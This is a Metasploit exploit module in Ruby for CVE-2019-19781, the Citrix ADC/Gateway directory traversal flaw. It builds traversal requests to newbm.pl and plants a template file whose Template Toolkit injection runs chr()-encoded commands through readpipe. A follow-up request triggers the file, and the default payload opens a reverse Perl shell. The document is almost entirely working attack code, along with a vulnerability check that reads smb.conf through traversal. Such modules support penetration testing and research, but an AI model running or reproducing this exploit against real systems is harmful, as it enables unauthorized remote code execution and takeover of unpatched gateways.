# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Citrix ADC Remote Code Execution&#039;,
      &#039;Description&#039; => %q(
        An issue was discovered in Citrix Application Delivery Controller (ADC)
        and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0. They allow Directory Traversal.
      ),
      &#039;Author&#039; => [
        &#039;RAMELLA SÃ©bastien&#039; # https://www.pirates.re/
      ],
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2019-19781&#039;],
        [&#039;URL&#039;, &#039;https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/&#039;],
        [&#039;EDB&#039;, &#039;47901&#039;],
        [&#039;EDB&#039;, &#039;47902&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;2019-12-17&#039;,
      &#039;License&#039; => MSF_LICENSE,
      &#039;Platform&#039; => [&#039;unix&#039;],
      &#039;Arch&#039; => ARCH_CMD,
      &#039;Privileged&#039; => true,
      &#039;Payload&#039; => {
        &#039;Compat&#039; => {
          &#039;PayloadType&#039; => &#039;cmd&#039;,
        }
      },
      &#039;Targets&#039; => [
        [&#039;Unix (remote shell)&#039;,
          &#039;Type&#039; => :cmd_shell,
          &#039;DefaultOptions&#039; => {
            &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_perl&#039;,
            &#039;DisablePayloadHandler&#039; => &#039;false&#039;
          }
        ],
        [&#039;Unix (command-line)&#039;,
          &#039;Type&#039; => :cmd_generic,
          &#039;DefaultOptions&#039; => {
            &#039;PAYLOAD&#039; => &#039;cmd/unix/generic&#039;,
            &#039;DisablePayloadHandler&#039; => &#039;true&#039;
          }
        ],
      ],
      &#039;DefaultTarget&#039; => 0,
      &#039;DefaultOptions&#039; => {
        &#039;RPORT&#039; => 443,
        &#039;SSL&#039;   => true
      },
      &#039;Notes&#039; => {
        &#039;Stability&#039; => [CRASH_SAFE],
        &#039;Reliability&#039; => [REPEATABLE_SESSION],
        &#039;SideEffects&#039; => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      OptAddress.new(&#039;RHOST&#039;, [true, &#039;The target address&#039;])
    ])

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false])
    ])

    deregister_options(&#039;RHOSTS&#039;)
  end

  def execute_command(command, opts = {})
    filename = Rex::Text.rand_text_alpha(16)
    nonce = Rex::Text.rand_text_alpha(6)

    request  = {
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(&#039;vpn&#039;, &#039;..&#039;, &#039;vpns&#039;, &#039;portal&#039;, &#039;scripts&#039;, &#039;newbm.pl&#039;),
      &#039;headers&#039; => {
        &#039;NSC_USER&#039; => &#039;../../../netscaler/portal/templates/&#039; + filename,
        &#039;NSC_NONCE&#039; => nonce
      },
      &#039;vars_post&#039; => {
        &#039;url&#039; => &#039;http://127.0.0.1&#039;,
        &#039;title&#039; => "[% template.new({&#039;BLOCK&#039;=&#039;print readpipe(#{get_chr_payload(command)})&#039;})%]",
        &#039;desc&#039; => &#039;desc&#039;,
        &#039;UI_inuse&#039; => &#039;RfWeb&#039;
      },
      &#039;encode_params&#039; => false
    }

    begin
      received = send_request_cgi(request)
    rescue ::OpenSSL::SSL::SSLError, ::Errno::ENOTCONN
      print_error(&#039;Unable to connect on the remote target.&#039;)
    end
    return false unless received

    if received.code == 200
      vprint_status("#{received.get_html_document.text}")
      sleep 2

      request = {
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(&#039;vpn&#039;, &#039;..&#039;, &#039;vpns&#039;, &#039;portal&#039;, filename + &#039;.xml&#039;),
        &#039;headers&#039; => {
          &#039;NSC_USER&#039; => nonce,
          &#039;NSC_NONCE&#039; => nonce
        }
      }

      ## Trigger to gain exploitation.
      begin
        send_request_cgi(request)
        received = send_request_cgi(request)
      rescue ::OpenSSL::SSL::SSLError, ::Errno::ENOTCONN
        print_error(&#039;Unable to connect on the remote target.&#039;)
      end
      return false unless received
      return received
    end

    return false
  end

  def get_chr_payload(command)
    chr_payload = command
    i = chr_payload.length

    output = ""
    chr_payload.each_char do | c |
      i = i - 1
      output << "chr(" << c.ord.to_s << ")"
      if i != 0
        output << " . "
      end
    end

    return output
  end

  def check
    begin
      received = send_request_cgi(
        "method" => "GET",
        "uri" => normalize_uri(&#039;vpn&#039;, &#039;..&#039;, &#039;vpns&#039;, &#039;cfg&#039;, &#039;smb.conf&#039;)
      )
    rescue ::OpenSSL::SSL::SSLError, ::Errno::ENOTCONN
      print_error(&#039;Unable to connect on the remote target.&#039;)
    end

    if received && received.code != 200
      return Exploit::CheckCode::Safe
    end
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    unless check.eql? Exploit::CheckCode::Vulnerable
      unless datastore[&#039;ForceExploit&#039;]
        fail_with(Failure::NotVulnerable, &#039;The target is not exploitable.&#039;)
      end
    else
        print_good(&#039;The target appears to be vulnerable.&#039;)
    end

    case target[&#039;Type&#039;]
    when :cmd_generic
      print_status("Sending #{datastore[&#039;PAYLOAD&#039;]} command payload")
      vprint_status("Generated command payload: #{payload.encoded}")

      received = execute_command(payload.encoded)
      if (received) && (datastore[&#039;PAYLOAD&#039;] == "cmd/unix/generic")
        print_warning(&#039;Dumping command output in parsed http response&#039;)
        print_good("#{received.get_html_document.text}")
      else
        print_warning(&#039;Empty response, no command output&#039;)
        return
      end

    when :cmd_shell
      print_status("Sending #{datastore[&#039;PAYLOAD&#039;]} command payload")
      vprint_status("Generated command payload: #{payload.encoded}")

      execute_command(payload.encoded)
    end
  end

end

